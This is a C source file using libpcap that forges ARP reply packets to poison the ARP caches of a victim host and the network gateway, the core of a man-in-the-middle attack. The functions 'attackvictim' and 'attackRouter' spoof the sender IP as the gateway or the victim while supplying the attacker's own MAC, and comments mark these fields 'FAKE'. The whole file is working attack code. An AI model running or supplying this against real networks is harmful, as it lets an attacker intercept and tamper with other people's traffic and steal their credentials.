#include "myHeader.h"

int setArpHeader(PARPHEADER header)
{
	/* set header */
	header->ethernet.ether_Type = ntohs(0x0806);
	header->arp.Hardware_type = ntohs(0x0001);
	header->arp.Protocol_type = ntohs(0x0800);
	header->arp.Hardware_size = 0x06;
	header->arp.Protocol_size = 0x04;
	header->arp.Opcode = ntohs(0x0002); // reply
	return 0;
}

int attackvictim(pcap_t* handle, PARPHEADER header, PLANINFO LanInfo)
{
	u_char packet[ARPSIZE + ETHERNETSIZE];
	/* set header */
	memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(header->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(header->arp.src_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));		// FAKE
	memcpy(header->arp.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(header->arp.dst_IP, &LanInfo->victimIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(packet, &(header->ethernet), sizeof(char) * ETHERNETSIZE);
	memcpy(packet + ETHERNETSIZE, &(header->arp), sizeof(char) * ARPSIZE);
	// send to router
	if (pcap_sendpacket(handle, packet, ARPSIZE + ETHERNETSIZE /* size */) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}


int attackRouter(pcap_t* handle, PARPHEADER header, PLANINFO LanInfo)
{
	u_char packet[ARPSIZE + ETHERNETSIZE];
	/* set header */
	memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(header->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(header->arp.src_IP, &LanInfo->victimIP, sizeof(IN_ADDR));		// FAKE
	memcpy(header->arp.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(header->arp.dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(packet, &(header->ethernet), sizeof(char) * ETHERNETSIZE);
	memcpy(packet + ETHERNETSIZE, &(header->arp), sizeof(char) * ARPSIZE);
	// send to router
	if (pcap_sendpacket(handle, packet, ARPSIZE + ETHERNETSIZE /* size */) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}